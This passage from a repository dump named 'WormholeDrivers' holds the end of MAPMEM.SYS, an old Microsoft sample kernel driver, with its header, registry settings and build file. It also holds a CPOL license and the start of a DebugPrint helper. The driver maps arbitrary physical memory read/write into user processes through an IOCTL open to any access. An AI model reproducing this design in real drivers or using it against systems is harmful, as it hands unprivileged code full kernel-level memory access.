    if (!NT_SUCCESS(ntStatus))
    {
        MapMemKdPrint (("MAPMEM.SYS: ZwOpenSection failed\n"));

        goto done;
    }

    ntStatus = ObReferenceObjectByHandle (physicalMemoryHandle,
                                          SECTION_ALL_ACCESS,
                                          (POBJECT_TYPE) NULL,
                                          KernelMode,
                                          &PhysicalMemorySection,
                                          (POBJECT_HANDLE_INFORMATION) NULL);

    if (!NT_SUCCESS(ntStatus))
    {
        MapMemKdPrint (("MAPMEM.SYS: ObReferenceObjectByHandle failed\n"));

        goto close_handle;
    }


    //
    // Initialize the physical addresses that will be translated
    //

    physicalAddressEnd = RtlLargeIntegerAdd (physicalAddress,
                                             RtlConvertUlongToLargeInteger(
                                             length));

    //
    // Translate the physical addresses.
    //

    translateBaseAddress =
        HalTranslateBusAddress (interfaceType,
                                busNumber,
                                physicalAddress,
                                &inIoSpace,
                                &physicalAddressBase);

    translateEndAddress =
        HalTranslateBusAddress (interfaceType,
                                busNumber,
                                physicalAddressEnd,
                                &inIoSpace2,
                                &physicalAddressEnd);

    if ( !(translateBaseAddress && translateEndAddress) )
    {
        MapMemKdPrint (("MAPMEM.SYS: HalTranslatephysicalAddress failed\n"));

        ntStatus = STATUS_UNSUCCESSFUL;

        goto close_handle;
    }

    //
    // Calculate the length of the memory to be mapped
    //

    mappedLength = RtlLargeIntegerSubtract (physicalAddressEnd,
                                            physicalAddressBase);


    //
    // If the mappedlength is zero, somthing very weird happened in the HAL
    // since the Length was checked against zero.
    //

    if (mappedLength.LowPart == 0)
    {
        MapMemKdPrint (("MAPMEM.SYS: mappedLength.LowPart == 0\n"));

        ntStatus = STATUS_UNSUCCESSFUL;

        goto close_handle;
    }

    length = mappedLength.LowPart;


    //
    // If the address is in io space, just return the address, otherwise
    // go through the mapping mechanism
    //

    if (inIoSpace)
    {
        *((PVOID *) IoBuffer) = (PVOID) physicalAddressBase.LowPart;
    }

    else
    {
        //
        // initialize view base that will receive the physical mapped
        // address after the MapViewOfSection call.
        //

        viewBase = physicalAddressBase;


        //
        // Let ZwMapViewOfSection pick an address
        //

        virtualAddress = NULL;



        //
        // Map the section
        //

        ntStatus = ZwMapViewOfSection (physicalMemoryHandle,
                                       (HANDLE) -1,
                                       &virtualAddress,
                                       0L,
                                       length,
                                       &viewBase,
                                       &length,
                                       ViewShare,
                                       0,
                                       PAGE_READWRITE | PAGE_NOCACHE);

        if (!NT_SUCCESS(ntStatus))
        {
            MapMemKdPrint (("MAPMEM.SYS: ZwMapViewOfSection failed\n"));

            goto close_handle;
        }

        //
        // Mapping the section above rounded the physical address down to the
        // nearest 64 K boundary. Now return a virtual address that sits where
        // we wnat by adding in the offset from the beginning of the section.
        //


        (ULONG) virtualAddress += (ULONG)physicalAddressBase.LowPart -
                                  (ULONG)viewBase.LowPart;

        *((PVOID *) IoBuffer) = virtualAddress;

    }

    ntStatus = STATUS_SUCCESS;



close_handle:

    ZwClose (physicalMemoryHandle);



done:

    return ntStatus;
}

```

`source/WormholeDrivers/MAPMEM/SYS/MAPMEM.H`:

```H
/*++

Copyright (c) 1993  Microsoft Corporation

Module Name:

    mapmem.h

Abstract:


Environment:

    kernel & User mode

Notes:


Revision History:

--*/


//
// Define the various device type values.  Note that values used by Microsoft
// Corporation are in the range 0-32767, and 32768-65535 are reserved for use
// by customers.
//

#define FILE_DEVICE_MAPMEM  0x00008000



//
// Macro definition for defining IOCTL and FSCTL function control codes.  Note
// that function codes 0-2047 are reserved for Microsoft Corporation, and
// 2048-4095 are reserved for customers.
//

#define MAPMEM_IOCTL_INDEX  0x800


//
// Define our own private IOCTL
//

#define IOCTL_MAPMEM_MAP_USER_PHYSICAL_MEMORY   CTL_CODE(FILE_DEVICE_MAPMEM , \
                                                         MAPMEM_IOCTL_INDEX,  \
                                                         METHOD_BUFFERED,     \
                                                         FILE_ANY_ACCESS)

#define IOCTL_MAPMEM_UNMAP_USER_PHYSICAL_MEMORY CTL_CODE(FILE_DEVICE_MAPMEM,  \
                                                         MAPMEM_IOCTL_INDEX+1,\
                                                         METHOD_BUFFERED,     \
                                                         FILE_ANY_ACCESS)




//
// Our user mode app will pass an initialized structure like this
//     down to the kernel mode driver
//

typedef struct
{
    INTERFACE_TYPE   InterfaceType; // Isa, Eisa, etc....
    ULONG            BusNumber;     // Bus number
    PHYSICAL_ADDRESS BusAddress;    // Bus-relative address
    ULONG            AddressSpace;  // 0 is memory, 1 is I/O
    ULONG            Length;        // Length of section to map

} PHYSICAL_MEMORY_INFO, *PPHYSICAL_MEMORY_INFO;

```

`source/WormholeDrivers/MAPMEM/SYS/MAPMEM.INI`:

```INI
\registry\machine\system\currentcontrolset\services\MapMem
    Type = REG_DWORD 0x00000001
    Start = REG_DWORD 0x00000003
    Group = Extended base
    ErrorControl = REG_DWORD 0x00000001

```

`source/WormholeDrivers/MAPMEM/SYS/SOURCES`:

```
TARGETNAME=mapmem
TARGETPATH=$(BASEDIR)\lib
TARGETTYPE=DRIVER

SOURCES=mapmem.c

```

`source/WormholeDrivers/PHYMEM/LICENSE`:

```
The Code Project Open License (CPOL) 1.02


    Preamble

This License governs Your use of the Work. This License is intended to
allow developers to use the Source Code and Executable Files provided as
part of the Work in any application in any form.

The main points subject to the terms of the License are:

  * Source Code and Executable Files can be used in commercial applications;
  * Source Code and Executable Files can be redistributed; and
  * Source Code can be modified to create derivative works.
  * No claim of suitability, guarantee, or any warranty whatsoever is
    provided. The software is provided "as-is".
  * The Article accompanying the Work may not be distributed or
    republished without the Author's consent

This License is entered between You, the individual or other entity
reading or otherwise making use of the Work licensed pursuant to this
License and the individual or other entity which offers the Work under
the terms of this License ("Author").


    License

THE WORK (AS DEFINED BELOW) IS PROVIDED UNDER THE TERMS OF THIS CODE
PROJECT OPEN LICENSE ("LICENSE"). THE WORK IS PROTECTED BY COPYRIGHT
AND/OR OTHER APPLICABLE LAW. ANY USE OF THE WORK OTHER THAN AS
AUTHORIZED UNDER THIS LICENSE OR COPYRIGHT LAW IS PROHIBITED.

BY EXERCISING ANY RIGHTS TO THE WORK PROVIDED HEREIN, YOU ACCEPT AND
AGREE TO BE BOUND BY THE TERMS OF THIS LICENSE. THE AUTHOR GRANTS YOU
THE RIGHTS CONTAINED HEREIN IN CONSIDERATION OF YOUR ACCEPTANCE OF SUCH
TERMS AND CONDITIONS. IF YOU DO NOT AGREE TO ACCEPT AND BE BOUND BY THE
TERMS OF THIS LICENSE, YOU CANNOT MAKE ANY USE OF THE WORK.

 1. Definitions.
     1. "Articles" means, collectively, all articles written by Author
        which describes how the Source Code and Executable Files for the
        Work may be used by a user.
     2. "Author" means the individual or entity that offers the Work
        under the terms of this License.
     3. "Derivative Work" means a work based upon the Work or upon the
        Work and other pre-existing works.
     4. "Executable Files" refer to the executables, binary files,
        configuration and any required data files included in the Work.
     5. "Publisher" means the provider of the website, magazine,
        CD-ROM, DVD or other medium from or by which the Work is
        obtained by You.
     6. "Source Code" refers to the collection of source code and
        configuration files used to create the Executable Files.
     7. "Standard Version" refers to such a Work if it has not been
        modified, or has been modified in accordance with the consent of
        the Author, such consent being in the full discretion of the
        Author.
     8. "Work" refers to the collection of files distributed by the
        Publisher, including the Source Code, Executable Files,
        binaries, data files, documentation, whitepapers and the Articles.
     9. "You" is you, an individual or entity wishing to use the Work
        and exercise your rights under this License.
 2. Fair Use/Fair Use Rights. Nothing in this License is intended to
    reduce, limit, or restrict any rights arising from fair use, fair
    dealing, first sale or other limitations on the exclusive rights of
    the copyright owner under copyright law or other applicable laws.
 3. License Grant. Subject to the terms and conditions of this
    License, the Author hereby grants You a worldwide, royalty-free,
    non-exclusive, perpetual (for the duration of the applicable
    copyright) license to exercise the rights in the Work as stated below:
     1. You may use the standard version of the Source Code or
        Executable Files in Your own applications.
     2. You may apply bug fixes, portability fixes and other
        modifications obtained from the Public Domain or from the
        Author. A Work modified in such a way shall still be considered
        the standard version and will be subject to this License.
     3. You may otherwise modify Your copy of this Work (excluding the
        Articles) in any way to create a Derivative Work, provided that
        You insert a prominent notice in each changed file stating how,
        when and where You changed that file.
     4. You may distribute the standard version of the Executable Files
        and Source Code or Derivative Work in aggregate with other
        (possibly commercial) programs as part of a larger (possibly
        commercial) software distribution.
     5. The Articles discussing the Work published in any form by the
        author may not be distributed or republished without the
        Author's consent. The author retains copyright to any such
        Articles. You may use the Executable Files and Source Code
        pursuant to this License but you may not repost or republish or
        otherwise distribute or make available the Articles, without the
        prior written consent of the Author.
    Any subroutines or modules supplied by You and linked into the
    Source Code or Executable Files of this Work shall not be considered
    part of this Work and will not be subject to the terms of this License.
 4. Patent License. Subject to the terms and conditions of this
    License, each Author hereby grants to You a perpetual, worldwide,
    non-exclusive, no-charge, royalty-free, irrevocable (except as
    stated in this section) patent license to make, have made, use,
    import, and otherwise transfer the Work.
 5. Restrictions. The license granted in Section 3 above is expressly
    made subject to and limited by the following restrictions:
     1. You agree not to remove any of the original copyright, patent,
        trademark, and attribution notices and associated disclaimers
        that may appear in the Source Code or Executable Files.
     2. You agree not to advertise or in any way imply that this Work is
        a product of Your own.
     3. The name of the Author may not be used to endorse or promote
        products derived from the Work without the prior written consent
        of the Author.
     4. You agree not to sell, lease, or rent any part of the Work. This
        does not restrict you from including the Work or any part of the
        Work inside a larger software distribution that itself is being
        sold. The Work by itself, though, cannot be sold, leased or rented.
     5. You may distribute the Executable Files and Source Code only
        under the terms of this License, and You must include a copy of,
        or the Uniform Resource Identifier for, this License with every
        copy of the Executable Files or Source Code You distribute and
        ensure that anyone receiving such Executable Files and Source
        Code agrees that the terms of this License apply to such
        Executable Files and/or Source Code. You may not offer or impose
        any terms on the Work that alter or restrict the terms of this
        License or the recipients' exercise of the rights granted
        hereunder. You may not sublicense the Work. You must keep intact
        all notices that refer to this License and to the disclaimer of
        warranties. You may not distribute the Executable Files or
        Source Code with any technological measures that control access
        or use of the Work in a manner inconsistent with the terms of
        this License.
     6. You agree not to use the Work for illegal, immoral or improper
        purposes, or on pages containing illegal, immoral or improper
        material. The Work is subject to applicable export laws. You
        agree to comply with all such laws and regulations that may
        apply to the Work after Your receipt of the Work.
 6. Representations, Warranties and Disclaimer. THIS WORK IS PROVIDED
    "AS IS", "WHERE IS" AND "AS AVAILABLE", WITHOUT ANY EXPRESS OR
    IMPLIED WARRANTIES OR CONDITIONS OR GUARANTEES. YOU, THE USER,
    ASSUME ALL RISK IN ITS USE, INCLUDING COPYRIGHT INFRINGEMENT, PATENT
    INFRINGEMENT, SUITABILITY, ETC. AUTHOR EXPRESSLY DISCLAIMS ALL
    EXPRESS, IMPLIED OR STATUTORY WARRANTIES OR CONDITIONS, INCLUDING
    WITHOUT LIMITATION, WARRANTIES OR CONDITIONS OF MERCHANTABILITY,
    MERCHANTABLE QUALITY OR FITNESS FOR A PARTICULAR PURPOSE, OR ANY
    WARRANTY OF TITLE OR NON-INFRINGEMENT, OR THAT THE WORK (OR ANY
    PORTION THEREOF) IS CORRECT, USEFUL, BUG-FREE OR FREE OF VIRUSES.
    YOU MUST PASS THIS DISCLAIMER ON WHENEVER YOU DISTRIBUTE THE WORK OR
    DERIVATIVE WORKS.
 7. Indemnity. You agree to defend, indemnify and hold harmless the
    Author and the Publisher from and against any claims, suits, losses,
    damages, liabilities, costs, and expenses (including reasonable
    legal or attorneys’ fees) resulting from or relating to any use of
    the Work by You.
 8. Limitation on Liability. EXCEPT TO THE EXTENT REQUIRED BY
    APPLICABLE LAW, IN NO EVENT WILL THE AUTHOR OR THE PUBLISHER BE
    LIABLE TO YOU ON ANY LEGAL THEORY FOR ANY SPECIAL, INCIDENTAL,
    CONSEQUENTIAL, PUNITIVE OR EXEMPLARY DAMAGES ARISING OUT OF THIS
    LICENSE OR THE USE OF THE WORK OR OTHERWISE, EVEN IF THE AUTHOR OR
    THE PUBLISHER HAS BEEN ADVISED OF THE POSSIBILITY OF SUCH DAMAGES.
 9. Termination.
     1. This License and the rights granted hereunder will terminate
        automatically upon any breach by You of any term of this
        License. Individuals or entities who have received Derivative
        Works from You under this License, however, will not have their
        licenses terminated provided such individuals or entities remain
        in full compliance with those licenses. Sections 1, 2, 6, 7, 8,
        9, 10 and 11 will survive any termination of this License.
     2. If You bring a copyright, trademark, patent or any other
        infringement claim against any contributor over infringements
        You claim are made by the Work, your License from such
        contributor to the Work ends automatically.
     3. Subject to the above terms and conditions, this License is
        perpetual (for the duration of the applicable copyright in the
        Work). Notwithstanding the above, the Author reserves the right
        to release the Work under different license terms or to stop
        distributing the Work at any time; provided, however that any
        such election will not serve to withdraw this License (or any
        other license that has been, or is required to be, granted under
        the terms of this License), and this License will continue in
        full force and effect unless terminated as stated above.
10. Publisher. The parties hereby confirm that the Publisher shall
    not, under any circumstances, be responsible for and shall not have
    any liability in respect of the subject matter of this License. The
    Publisher makes no warranty whatsoever in connection with the Work
    and shall not be liable to You or any party on any legal theory for
    any damages whatsoever, including without limitation any general,
    special, incidental or consequential damages arising in connection
    to this license. The Publisher reserves the right to cease making
    the Work available to You at any time without notice
11. Miscellaneous
     1. This License shall be governed by the laws of the location of
        the head office of the Author or if the Author is an individual,
        the laws of location of the principal place of residence of the
        Author.
     2. If any provision of this License is invalid or unenforceable
        under applicable law, it shall not affect the validity or
        enforceability of the remainder of the terms of this License,
        and without further action by the parties to this License, such
        provision shall be reformed to the minimum extent necessary to
        make such provision valid and enforceable.
     3. No term or provision of this License shall be deemed waived and
        no breach consented to unless such waiver or consent shall be in
        writing and signed by the party to be charged with such waiver
        or consent.
     4. This License constitutes the entire agreement between the
        parties with respect to the Work licensed herein. There are no
        understandings, agreements or representations with respect to
        the Work not specified herein. The Author shall not be bound by
        any additional provisions that may appear in any communication
        from You. This License may not be modified without the mutual
        written agreement of the Author and You.


```

`source/WormholeDrivers/PHYMEM/LICENSE.html`:

```html
<html>
<head>
<title>The Code Project Open License (COPL)</title>
<Style>
BODY, P, TD { font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 10pt }
H1,H2,H3,H4,H5 { color: #ff9900; font-weight: bold; }
H1 { font-size: 14pt;color:black }
H2 { font-size: 13pt; }
H3 { font-size: 12pt; }
H4 { font-size: 10pt; color: black; }
PRE { BACKGROUND-COLOR: #FBEDBB; FONT-FAMILY: "Courier New", Courier, mono; WHITE-SPACE: pre; }
CODE { COLOR: #990000; FONT-FAMILY: "Courier New", Courier, mono; }
.SpacedList li { padding: 5px 0px 5px 0px;}
</style>
</head>
<body bgcolor="#FFFFFF" color=#000000>

<h1>The Code Project Open License (CPOL) 1.02</h1>
<br />

<center>
<div style="text-align: left; border: 2px solid #000000; width: 660; background-color: #FFFFD9; padding: 20px;">

<h2>Preamble</h2>
<p>
	This License governs Your use of the Work. This License is intended to allow developers
	to use the Source Code and Executable Files provided as part of the Work in any
	application in any form.
</p>
<p>
	The main points subject to the terms of the License are:</p>
<ul>
	<li>Source Code and Executable Files can be used in commercial applications;</li>
	<li>Source Code and Executable Files can be redistributed; and</li>
	<li>Source Code can be modified to create derivative works.</li>
	<li>No claim of suitability, guarantee, or any warranty whatsoever is provided. The software is
	provided "as-is".</li>
	<li>The Article accompanying the Work may not be distributed or republished without the 
	Author's consent</li>
</ul>

<p>
	This License is entered between You, the individual or other entity reading or otherwise
	making use of the Work licensed pursuant to this License and the individual or other
	entity which offers the Work under the terms of this License ("Author").</p>

	<h2>License</h2>
	<p>
		THE WORK (AS DEFINED BELOW) IS PROVIDED UNDER THE TERMS OF THIS CODE PROJECT OPEN
		LICENSE ("LICENSE"). THE WORK IS PROTECTED BY COPYRIGHT AND/OR OTHER APPLICABLE
		LAW. ANY USE OF THE WORK OTHER THAN AS AUTHORIZED UNDER THIS LICENSE OR COPYRIGHT
		LAW IS PROHIBITED.</p>
	<p>
		BY EXERCISING ANY RIGHTS TO THE WORK PROVIDED HEREIN, YOU ACCEPT AND AGREE TO BE
		BOUND BY THE TERMS OF THIS LICENSE. THE AUTHOR GRANTS YOU THE RIGHTS CONTAINED HEREIN
		IN CONSIDERATION OF YOUR ACCEPTANCE OF SUCH TERMS AND CONDITIONS. IF YOU DO NOT
		AGREE TO ACCEPT AND BE BOUND BY THE TERMS OF THIS LICENSE, YOU CANNOT MAKE ANY
		USE OF THE WORK.</p>
	
<ol class="SpacedList">
	<li><strong>Definitions.</strong>
	
		<ol class="SpacedList" style="list-style-type: lower-alpha;">
			<li><strong>"Articles"</strong> means, collectively, all articles written by Author
				which describes how the Source Code and Executable Files for the Work may be used
				by a user.</li>
			<li><b>"Author"</b> means the individual or entity that offers the Work under the terms
				of this License.<strong></strong></li>
			<li><strong>"Derivative Work"</strong> means a work based upon the Work or upon the
				Work and other pre-existing works.</li>
			<li><b>"Executable Files"</b> refer to the executables, binary files, configuration
				and any required data files included in the Work.</li>
			<li>"<b>Publisher</b>" means the provider of the website, magazine, CD-ROM, DVD or other
				medium from or by which the Work is obtained by You.</li>
			<li><b>"Source Code"</b> refers to the collection of source code and configuration files
				used to create the Executable Files.</li>
			<li><b>"Standard Version"</b> refers to such a Work if it has not been modified, or
				has been modified in accordance with the consent of the Author, such consent being
				in the full discretion of the Author. </li>
			<li><b>"Work"</b> refers to the collection of files distributed by the Publisher, including
				the Source Code, Executable Files, binaries, data files, documentation, whitepapers
				and the Articles. </li>
			<li><b>"You"</b> is you, an individual or entity wishing to use the Work and exercise
				your rights under this License.
			</li>
		</ol>
	</li>
	
	<li><strong>Fair Use/Fair Use Rights.</strong> Nothing in this License is intended to
		reduce, limit, or restrict any rights arising from fair use, fair dealing, first
		sale or other limitations on the exclusive rights of the copyright owner under copyright
		law or other applicable laws.
	</li>
	
	<li><strong>License Grant.</strong> Subject to the terms and conditions of this License,
		the Author hereby grants You a worldwide, royalty-free, non-exclusive, perpetual
		(for the duration of the applicable copyright) license to exercise the rights in
		the Work as stated below:
		
		<ol class="SpacedList" style="list-style-type: lower-alpha;">
			<li>You may use the standard version of the Source Code or Executable Files in Your
				own applications. </li>
			<li>You may apply bug fixes, portability fixes and other modifications obtained from
				the Public Domain or from the Author. A Work modified in such a way shall still
				be considered the standard version and will be subject to this License.</li>
			<li>You may otherwise modify Your copy of this Work (excluding the Articles) in any
				way to create a Derivative Work, provided that You insert a prominent notice in
				each changed file stating how, when and where You changed that file.</li>
			<li>You may distribute the standard version of the Executable Files and Source Code
				or Derivative Work in aggregate with other (possibly commercial) programs as part
				of a larger (possibly commercial) software distribution. </li>
			<li>The Articles discussing the Work published in any form by the author may not be
				distributed or republished without the Author&#39;s consent. The author retains
				copyright to any such Articles. You may use the Executable Files and Source Code
				pursuant to this License but you may not repost or republish or otherwise distribute
				or make available the Articles, without the prior written consent of the Author.</li>
		</ol>
	
		Any subroutines or modules supplied by You and linked into the Source Code or Executable
		Files of this Work shall not be considered part of this Work and will not be subject
		to the terms of this License.
	</li>
	
	<li><strong>Patent License.</strong> Subject to the terms and conditions of this License, 
	each Author hereby grants to You a perpetual, worldwide, non-exclusive, no-charge, royalty-free, 
	irrevocable (except as stated in this section) patent license to make, have made, use, import, 
	and otherwise transfer the Work.</li>
	
	<li><strong>Restrictions.</strong> The license granted in Section 3 above is expressly
		made subject to and limited by the following restrictions:
		
		<ol class="SpacedList" style="list-style-type: lower-alpha;">
			<li>You agree not to remove any of the original copyright, patent, trademark, and 
				attribution notices and associated disclaimers that may appear in the Source Code 
				or Executable Files. </li>
			<li>You agree not to advertise or in any way imply that this Work is a product of Your
				own. </li>
			<li>The name of the Author may not be used to endorse or promote products derived from
				the Work without the prior written consent of the Author.</li>
			<li>You agree not to sell, lease, or rent any part of the Work. This does not restrict
			    you from including the Work or any part of the Work inside a larger software 
			    distribution that itself is being sold. The Work by itself, though, cannot be sold, 
			    leased or rented.</li>
			<li>You may distribute the Executable Files and Source Code only under the terms of
				this License, and You must include a copy of, or the Uniform Resource Identifier
				for, this License with every copy of the Executable Files or Source Code You distribute
				and ensure that anyone receiving such Executable Files and Source Code agrees that
				the terms of this License apply to such Executable Files and/or Source Code. You
				may not offer or impose any terms on the Work that alter or restrict the terms of
				this License or the recipients&#39; exercise of the rights granted hereunder. You
				may not sublicense the Work. You must keep intact all notices that refer to this
				License and to the disclaimer of warranties. You may not distribute the Executable
				Files or Source Code with any technological measures that control access or use
				of the Work in a manner inconsistent with the terms of this License. </li>
			<li>You agree not to use the Work for illegal, immoral or improper purposes, or on pages
				containing illegal, immoral or improper material. The Work is subject to applicable
				export laws. You agree to comply with all such laws and regulations that may apply
				to the Work after Your receipt of the Work.
			</li>
		</ol>
	</li>
	
	<li><strong>Representations, Warranties and Disclaimer.</strong> THIS WORK IS PROVIDED
		"AS IS", "WHERE IS" AND "AS AVAILABLE", WITHOUT ANY EXPRESS OR IMPLIED WARRANTIES
		OR CONDITIONS OR GUARANTEES. YOU, THE USER, ASSUME ALL RISK IN ITS USE, INCLUDING
		COPYRIGHT INFRINGEMENT, PATENT INFRINGEMENT, SUITABILITY, ETC. AUTHOR EXPRESSLY
		DISCLAIMS ALL EXPRESS, IMPLIED OR STATUTORY WARRANTIES OR CONDITIONS, INCLUDING
		WITHOUT LIMITATION, WARRANTIES OR CONDITIONS OF MERCHANTABILITY, MERCHANTABLE QUALITY
		OR FITNESS FOR A PARTICULAR PURPOSE, OR ANY WARRANTY OF TITLE OR NON-INFRINGEMENT,
		OR THAT THE WORK (OR ANY PORTION THEREOF) IS CORRECT, USEFUL, BUG-FREE OR FREE OF
		VIRUSES. YOU MUST PASS THIS DISCLAIMER ON WHENEVER YOU DISTRIBUTE THE WORK OR DERIVATIVE
		WORKS.
	</li>
	
	<li><b>Indemnity. </b>You agree to defend, indemnify and hold harmless the Author and
		the Publisher from and against any claims, suits, losses, damages, liabilities,
		costs, and expenses (including reasonable legal or attorneys’ fees) resulting from
		or relating to any use of the Work by You.
	</li>
	
	<li><strong>Limitation on Liability.</strong> EXCEPT TO THE EXTENT REQUIRED BY APPLICABLE
		LAW, IN NO EVENT WILL THE AUTHOR OR THE PUBLISHER BE LIABLE TO YOU ON ANY LEGAL
		THEORY FOR ANY SPECIAL, INCIDENTAL, CONSEQUENTIAL, PUNITIVE OR EXEMPLARY DAMAGES
		ARISING OUT OF THIS LICENSE OR THE USE OF THE WORK OR OTHERWISE, EVEN IF THE AUTHOR
		OR THE PUBLISHER HAS BEEN ADVISED OF THE POSSIBILITY OF SUCH DAMAGES.
	</li>
	
	<li><strong>Termination.</strong>
	
		<ol style="list-style-type: lower-alpha;">
			<li>This License and the rights granted hereunder will terminate automatically upon
				any breach by You of any term of this License. Individuals or entities who have
				received Derivative Works from You under this License, however, will not have their
				licenses terminated provided such individuals or entities remain in full compliance
				with those licenses. Sections 1, 2, 6, 7, 8, 9, 10 and 11 will survive any termination
				of this License. </li>
				
			<li>If You bring a copyright, trademark, patent or any other infringement claim against 
				any contributor over infringements You claim are made by the Work, your License 
				from such contributor to the Work ends automatically.</li>
				
			<li>Subject to the above terms and conditions, this License is perpetual (for the duration
				of the applicable copyright in the Work). Notwithstanding the above, the Author
				reserves the right to release the Work under different license terms or to stop
				distributing the Work at any time; provided, however that any such election will
				not serve to withdraw this License (or any other license that has been, or is required
				to be, granted under the terms of this License), and this License will continue
				in full force and effect unless terminated as stated above.
			</li>
		</ol>
	</li>
	
	<li><strong>Publisher</strong>. The parties hereby confirm that the Publisher shall
		not, under any circumstances, be responsible for and shall not have any liability
		in respect of the subject matter of this License. The Publisher makes no warranty
		whatsoever in connection with the Work and shall not be liable to You or any party
		on any legal theory for any damages whatsoever, including without limitation any
		general, special, incidental or consequential damages arising in connection to this
		license. The Publisher reserves the right to cease making the Work available to
		You at any time without notice</li>
		
	<li><strong>Miscellaneous</strong>
	
		<ol class="SpacedList" style="list-style-type: lower-alpha;">
			<li>This License shall be governed by the laws of the location of the head office of
				the Author or if the Author is an individual, the laws of location of the principal
				place of residence of the Author.</li>
			<li>If any provision of this License is invalid or unenforceable under applicable law,
				it shall not affect the validity or enforceability of the remainder of the terms
				of this License, and without further action by the parties to this License, such
				provision shall be reformed to the minimum extent necessary to make such provision
				valid and enforceable. </li>
			<li>No term or provision of this License shall be deemed waived and no breach consented
				to unless such waiver or consent shall be in writing and signed by the party to
				be charged with such waiver or consent. </li>
			<li>This License constitutes the entire agreement between the parties with respect to
				the Work licensed herein. There are no understandings, agreements or representations
				with respect to the Work not specified herein. The Author shall not be bound by
				any additional provisions that may appear in any communication from You. This License
				may not be modified without the mutual written agreement of the Author and You.
			</li>
		</ol>
		
	</li>
</ol>

</div>
</center>

</body>
</html>

```

`source/WormholeDrivers/PHYMEM/PCIFlt/DebugPrint.c`:

```c
//////////////////////////////////////////////////////////////////////////////
//	Copyright © 1998,1999 PHD Computer Consultants Ltd
//
//	DebugPrint code to add to a test driver		http://www.phdcc.com/debugprint/
/////////////////////////////////////////////////////////////////////////////
//	DebugPrint.cpp:			Debug printing in test driver
/////////////////////////////////////////////////////////////////////////////
//	DebugPrintInit			Initialise DebugPrint
//	DebugPrintMsg			Print ANSI string
//	DebugPrintClose			Close DebugPrint
//	DebugPrint				Formatted print, allocating 100 byte print buffer
//	DebugPrint2				Formatted print, specifying print buffer size
//*	DebugPrintVA			Allocate DebugPrint buffer and call DebugSprintf
//*	PrintXxx				Print various types to buffer
//*	DebugSprintf			Do formatted print to buffer
//*	ANSIstrlen				Get ANSI string length
//*	DebugPrintSystemThread	System thread to print device events.
//*	OpenDebugPrintDriver	Attempt to open DebugPrt driver for 5 mins
//*	ClearEvents				Clear any remaining events
/////////////////////////////////////////////////////////////////////////////
//	DebugPrinting occurs automatically in checked build
//	To force debug printing in free build, #define DEBUGPRINT 1
/////////////////////////////////////////////////////////////////////////////
//	Format specification characters
//		%c	ANSI char
//		%C	Wide char
//		%d	Signed int in decimal
//		%D	__int64 in decimal
//		%i	Signed int in decimal
//		%I	IRP
//		%l	__int64 in hex
//		%L	LARGE_INTEGER in hex
//		%s	null-terminated ANSI char string
//		%S	null-terminated Wide char string
//		%T	PUNICODE_STRING
//		%u	ULONG in decimal
//		%x	ULONG in hex
//
//	Be very careful to provide appropriate parameters for the formatted string
//	in your calls to DebugPrint.
/////////////////////////////////////////////////////////////////////////////
//	Version history
//	7-Dec-98	1.0.0	CC	creation
//	17-Dec-98	1.0.1	CC	DriverName allocated from NonPagedPool
//	21-Dec-98	1.0.1	CC	sizeof char * used properly
//	28-Dec-98	1.0.2	CC	%* allowed for %sSx
//	22-Jan-99	1.0.3	CC	%D, %l, %L added.  width>'9' allowed
//	16-Feb-99	1.0.4	CC	RtlInitUnicodeString used
//	31-Mar-99	1.0.5	CC	Altered to make it work in NT4
//	24-Apr-99	1.0.5	CC	DebugPrintClose checks DebugPrintStarted
//	25-Apr-99	1.0.5	CC	System thread tries for 5 mins to open DebugPrt
//	13-May-99	1.0.6	CC	IRP_MN_QUERY_LEGACY_BUS_INFORMATION added
//	19-May-99	1.0.6	CC	ThreadExiting ensures that thread finished before unload
/////////////////////////////////////////////////////////////////////////////

#ifdef __cplusplus
extern "C"
{
#endif
#include <wdm.h>
#ifdef __cplusplus
}
#endif

#include "debugprint.h"
#include <stdarg.h>	// OK to use this for va_* macros

#if DODEBUGPRINT

//////////////////////////////////////////////////////////////////////////////
//	Definitions copied from Wdm.h to make this compile in NT4
//	Cross-fingers - lets hope these definitions do not change

#define Dbp_IRP_MJ_POWER                    0x16
#define Dbp_IRP_MJ_SYSTEM_CONTROL           0x17
#define Dbp_IRP_MJ_PNP                      0x1b

#define Dbp_IRP_MN_QUERY_DEVICE_RELATIONS       0x07

#define Dbp_IRP_MN_SET_POWER                    0x02
#define Dbp_IRP_MN_QUERY_POWER                  0x03

typedef enum Dbp__DEVICE_RELATION_TYPE {
    Dbp_BusRelations,
    Dbp_EjectionRelations,
    Dbp_PowerRelations,
    Dbp_RemovalRelations,
    Dbp_TargetDeviceRelation
} Dbp_DEVICE_RELATION_TYPE, *Dbp_PDEVICE_RELATION_TYPE;

typedef struct _Dbp_QueryDeviceRelations
{
	Dbp_DEVICE_RELATION_TYPE Type;
} Dbp_QueryDeviceRelations, *Dbp_PQueryDeviceRelations;

typedef enum _Dbp_SYSTEM_POWER_STATE {
    Dbp_PowerSystemUnspecified = 0,
    Dbp_PowerSystemWorking,
    Dbp_PowerSystemSleeping1,
    Dbp_PowerSystemSleeping2,
    Dbp_PowerSystemSleeping3,
    Dbp_PowerSystemHibernate,
    Dbp_PowerSystemShutdown,
    Dbp_PowerSystemMaximum
} Dbp_SYSTEM_POWER_STATE, *Dbp_PSYSTEM_POWER_STATE;

typedef enum {
    Dbp_PowerActionNone,
    Dbp_PowerActionReserved,
    Dbp_PowerActionSleep,
    Dbp_PowerActionHibernate,
    Dbp_PowerActionShutdown,
    Dbp_PowerActionShutdownReset,
    Dbp_PowerActionShutdownOff
} Dbp_POWER_ACTION, *Dbp_PPOWER_ACTION;

typedef enum _Dbp_DEVICE_POWER_STATE {
    Dbp_PowerDeviceUnspecified = 0,
    Dbp_PowerDeviceD0,
    Dbp_PowerDeviceD1,
    Dbp_PowerDeviceD2,
    Dbp_PowerDeviceD3,
    Dbp_PowerDeviceMaximum
} Dbp_DEVICE_POWER_STATE, *Dbp_PDEVICE_POWER_STATE;

typedef enum _Dbp_POWER_STATE_TYPE {
    Dbp_SystemPowerState,
    Dbp_DevicePowerState
} Dbp_POWER_STATE_TYPE, *Dbp_PPOWER_STATE_TYPE;

typedef union _Dbp_POWER_STATE {
    Dbp_SYSTEM_POWER_STATE SystemState;
    Dbp_DEVICE_POWER_STATE DeviceState;
} Dbp_POWER_STATE, *Dbp_PPOWER_STATE;

typedef struct _Dbp_Power {
    ULONG SystemContext;
    Dbp_POWER_STATE_TYPE Type;
    Dbp_POWER_STATE State;
    Dbp_POWER_ACTION ShutdownType;
} Dbp_Power, *Dbp_PPower;

